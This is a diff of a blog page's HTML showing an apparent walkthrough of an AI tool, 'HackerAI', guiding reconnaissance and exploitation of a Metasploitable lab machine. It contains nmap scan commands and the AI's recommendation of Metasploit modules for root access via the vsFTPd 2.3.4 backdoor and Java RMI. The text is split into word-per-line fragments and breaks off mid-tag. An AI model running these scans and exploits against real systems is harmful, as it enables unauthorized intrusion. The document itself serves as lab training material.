@@ -12,9 +12,9 @@
 
 <script src="https://1200km.com/assets/theme-bootstrap.js"></script>
 <script src="https://1200km.com/assets/docusaurus-ecosystem.js?v=20260614-3" defer="defer"></script>
-<script src="https://1200km.com/assets/site-theme.js?v=20260721-shell" defer="defer"></script><link rel="stylesheet" href="/medium-blog-navigation/assets/css/styles.b6927b30.css">
-<script src="/medium-blog-navigation/assets/js/runtime~main.95700119.js" defer="defer"></script>
-<script src="/medium-blog-navigation/assets/js/main.23491b58.js" defer="defer"></script>
+<script src="https://1200km.com/assets/site-theme.js?v=20260721-shell" defer="defer"></script><link rel="stylesheet" href="/medium-blog-navigation/assets/css/styles.c1e57449.css">
+<script src="/medium-blog-navigation/assets/js/runtime~main.6451042c.js" defer="defer"></script>
+<script src="/medium-blog-navigation/assets/js/main.287ec159.js" defer="defer"></script>
 <meta name="robots" content="noindex,follow">
 </head>
 <body>
@@ -62,7 +62,243 @@
 <img src="https://cdn-images-1.medium.com/max/800/1*2ED-x3zsAa6b2AfyIOi4eA.png" alt="Article image" width="993" height="532" loading="lazy" decoding="async">
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">User</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: &quot;I have a Linux server at 172.16.59.128 (Metasploitable). How should I begin recon and scanning?&quot;</span><br></div></code></pre></div></div>
 <p><strong>HackerAI’s likely advice:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">That</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;s a great target for some initial reconnaissance. Since you&#x27;ve confirmed you have authorization, let&#x27;s get started.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">For</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> a Linux server </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">like</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Metasploitable, your initial recon </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> scanning efforts should focus </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">on</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> discovering open ports, the services running </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">on</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> them, </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the operating system version. Here</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;s a solid plan of action, starting with the most common and powerful tools:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Phase </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">1</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: Host </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Basic Port Discovery</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Ping Sweep (Check Host Status): First, verify the host </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> up </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> responding. Since the host </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">on</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> a local network, a simple ping should suffice.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">bash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ping -c </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">4</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">172.16</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">59.128</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">(Metasploitable </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> designed </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> be up, but this </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> a good habit.)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Basic TCP SYN Scan </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">with</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Nmap: Nmap </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the go-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> tool </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> port scanning. A fast SYN scan (-sS) </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> usually stealthier </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> quicker than a full TCP connect scan, though Metasploitable will likely respond </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> anything. This initial scan focuses </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">on</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">1000</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> most common ports.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">bash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sS </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">172.16</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">59.128</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Phase </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: Comprehensive Service </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Version Detection</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Once you have the initial list </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">of</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> open ports, you want </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> dig deeper. This </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">where</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> you run a more comprehensive scan.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Full Service </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Version Detection Scan: Use the -A (Aggressive) flag </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">or</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> a combination </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">of</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the following </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> a robust scan. The -sV flag </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> crucial </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">as</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> it attempts </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> determine the service name </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> version number running </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">on</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the open ports, which </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> vital </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> later vulnerability research.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">bash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nmap -p- -sV -O </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">172.16</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">59.128</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-p- : Scans all </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">65535</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ports (takes longer, but ensures no services are missed).</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-sV : Attempts </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> determine service version information.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-O : Enables OS detection.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Phase </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">3</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: Scripting </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Vulnerability Enumeration</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">After identifying services </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> versions, Nmap</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;s Scripting Engine (NSE) allows you to perform in-depth checks on the services it found.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Default</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Scripts </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Vulnerability Check: Running the -sC </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">or</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> --script=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">default</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> flag executes a </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">set</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">of</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> common, non-destructive scripts that provide more information. You can also run basic vulnerability checks.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">bash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sC --script=vuln </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">172.16</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">59.128</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-sC / --script=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">default</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: Runs the </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">default</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">set</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">of</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> scripts (e.g., checks </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> anonymous FTP access, web server information, etc.).</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">--script=vuln: Runs scripts that check </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> common vulnerabilities.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Summary </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">of</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Next</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Steps</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">After running these Nmap commands, you will have a wealth </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">of</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> information:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Open Ports: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">21</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> (FTP), </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">22</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> (SSH), </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">23</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> (Telnet), </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">80</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> (HTTP), etc.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Service Banners: Detailed version numbers (e.g., Apache </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">2.2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">8</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">, ProFTPD </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">1.3</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">1</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">).</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Operating System: Likely a Linux kernel version (since it</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;s Metasploitable).</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Your </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">next</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> logical </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">step</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> would be </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> enumerate </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">each</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> discovered service individually. </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">For</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> example:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">If</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Port </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">80</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> (HTTP) </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> open, use nikto </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">or</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> dirb/gobuster </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> scan </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> web server flaws </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> hidden directories.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">If</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Port </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">21</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> (FTP) </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> open, attempt anonymous login </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">or</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> look up known vulnerabilities </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> that specific FTP service version.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">If</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Port </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">139</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">445</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> (SMB) </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> open, use enum4linux </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">or</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> smbclient </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> collect user/share information.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">What are the results </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">of</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> your initial Nmap scan? </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Let</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;s analyze the open ports and services you find!</span><br></div></code></pre></div></div>
+<details class="plain-large-code" data-plain-code-lines="237"><summary>Large code or log block<!-- --> · <!-- -->237<!-- --> lines · expand raw text</summary><button type="button">Copy raw text</button><pre tabindex="0"><code>That
+&#x27;s a great target for some initial reconnaissance. Since you&#x27;ve confirmed you have authorization, let&#x27;s get started.
+For
+ a Linux server 
+like
+ Metasploitable, your initial recon 
+and
+ scanning efforts should focus 
+on
+ discovering open ports, the services running 
+on
+ them, 
+and
+ the operating system version. Here
+&#x27;s a solid plan of action, starting with the most common and powerful tools:
+Phase 
+1
+: Host 
+and
+ Basic Port Discovery
+Ping Sweep (Check Host Status): First, verify the host 
+is
+ up 
+and
+ responding. Since the host 
+is
+ 
+on
+ a local network, a simple ping should suffice.
+bash
+ping -c 
+4
+ 
+172.16
+.
+59.128
+(Metasploitable 
+is
+ designed 
+to
+ be up, but this 
+is
+ a good habit.)
+Basic TCP SYN Scan 
+with
+ Nmap: Nmap 
+is
+ the go-
+to
+ tool 
+for
+ port scanning. A fast SYN scan (-sS) 
+is
+ usually stealthier 
+and
+ quicker than a full TCP connect scan, though Metasploitable will likely respond 
+to
+ anything. This initial scan focuses 
+on
+ the 
+1000
+ most common ports.
+bash
+nmap -sS 
+172.16
+.
+59.128
+Phase 
+2
+: Comprehensive Service 
+and
+ Version Detection
+Once you have the initial list 
+of
+ open ports, you want 
+to
+ dig deeper. This 
+is
+ 
+where
+ you run a more comprehensive scan.
+Full Service 
+and
+ Version Detection Scan: Use the -A (Aggressive) flag 
+or
+ a combination 
+of
+ the following 
+for
+ a robust scan. The -sV flag 
+is
+ crucial 
+as
+ it attempts 
+to
+ determine the service name 
+and
+ version number running 
+on
+ the open ports, which 
+is
+ vital 
+for
+ later vulnerability research.
+bash
+nmap -p- -sV -O 
+172.16
+.
+59.128
+-p- : Scans all 
+65535
+ ports (takes longer, but ensures no services are missed).
+-sV : Attempts 
+to
+ determine service version information.
+-O : Enables OS detection.
+Phase 
+3
+: Scripting 
+and
+ Vulnerability Enumeration
+After identifying services 
+and
+ versions, Nmap
+&#x27;s Scripting Engine (NSE) allows you to perform in-depth checks on the services it found.
+Default
+ Scripts 
+and
+ Vulnerability Check: Running the -sC 
+or
+ --script=
+default
+ flag executes a 
+set
+ 
+of
+ common, non-destructive scripts that provide more information. You can also run basic vulnerability checks.
+bash
+nmap -sC --script=vuln 
+172.16
+.
+59.128
+-sC / --script=
+default
+: Runs the 
+default
+ 
+set
+ 
+of
+ scripts (e.g., checks 
+for
+ anonymous FTP access, web server information, etc.).
+--script=vuln: Runs scripts that check 
+for
+ common vulnerabilities.
+Summary 
+of
+ 
+Next
+ Steps
+After running these Nmap commands, you will have a wealth 
+of
+ information:
+Open Ports: 
+21
+ (FTP), 
+22
+ (SSH), 
+23
+ (Telnet), 
+80
+ (HTTP), etc.
+Service Banners: Detailed version numbers (e.g., Apache 
+2.2
+.
+8
+, ProFTPD 
+1.3
+.
+1
+).
+Operating System: Likely a Linux kernel version (since it
+&#x27;s Metasploitable).
+Your 
+next
+ logical 
+step
+ would be 
+to
+ enumerate 
+each
+ discovered service individually. 
+For
+ example:
+If
+ Port 
+80
+ (HTTP) 
+is
+ open, use nikto 
+or
+ dirb/gobuster 
+to
+ scan 
+for
+ web server flaws 
+and
+ hidden directories.
+If
+ Port 
+21
+ (FTP) 
+is
+ open, attempt anonymous login 
+or
+ look up known vulnerabilities 
+for
+ that specific FTP service version.
+If
+ Port 
+139
+/
+445
+ (SMB) 
+is
+ open, use enum4linux 
+or
+ smbclient 
+to
+ collect user/share information.
+What are the results 
+of
+ your initial Nmap scan? 
+Let
+&#x27;s analyze the open ports and services you find!
+</code></pre></details>
 <p>Now, perform the scan:</p>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sS -sV -O </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.101</span><br></div></code></pre></div></div>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sC </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">--script=vuln 172.16.59.128</span><br></div></code></pre></div></div>
@@ -75,12 +311,459 @@
 <p>This is where HackerAI’s knowledge of exploits and CVEs accelerates the process. Let’s leverage it to analyze the scan results:</p>
 <p>If you have the paid version, save the scan results to a<code>.txt</code>file and upload it to HackerAI — or simply copy and paste the content directly.</p>
 <p><strong>Response:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">That is an excellent, information-rich scan! As anticipated with Metasploitable, you&#x27;ve uncovered a trove of low-hanging fruit. This report is a clear, prioritized roadmap for exploitation.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">The Nmap Scripting Engine (NSE) has practically done the hard work of vulnerability assessment for you, identifying several critical flaws on various services and even confirming root-level exploitation on one of them.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Here is a breakdown of the most critical findings and the recommended next steps, ranging from immediate root access to further enumeration for later exploitation:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">---</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">### </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**CRITICAL VULNERABILITIES (Immediate Root Access)**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">The most urgent finding is on </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Port 21 (FTP)**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">*</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Service:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> vsFTPd</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">*</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Vulnerability:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**vsFTPd version 2.3.4 Backdoor (CVE-2011-2523)**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">*</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Impact:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> The Nmap script provided the best possible result—it executed a command (</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">`id`</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">) and confirmed it received </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**root privileges (`uid=0(root) gid=0(root)`)**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. This means this vulnerability is immediately exploitable to get a root shell on the system.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Action Plan (Immediate Exploitation):**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">1.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Exploit with Metasploit:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Metasploit Framework is the ideal choice for this and is even referenced in the Nmap output.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Module:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">`exploit/unix/ftp/vsftpd_234_backdoor`</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Payload:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Set the </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">`RHOSTS`</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> to </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">`172.16.59.128`</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> and run the exploit. The module simply requires a smiley face </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">`:)`</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> in the username to trigger the backdoor command listener (usually port 6200/tcp).</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">### </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**HIGH-PRIORITY VULNERABILITIES**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">These are other services with critical, confirmed vulnerabilities:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">1.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Port 1099 (Rmiregistry)**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Vulnerability:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**RMI registry default configuration Remote Code Execution**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Impact:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Java RMI (Remote Method Invocation) is often misconfigured to allow class loading from remote URLs, leading to remote code execution. This is another prime target for Metasploit.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    **Action Plan:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *   **Module:** `exploit/multi/misc/java_rmi_server` in Metasploit.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">2.</span><br></div><div class="token-line" 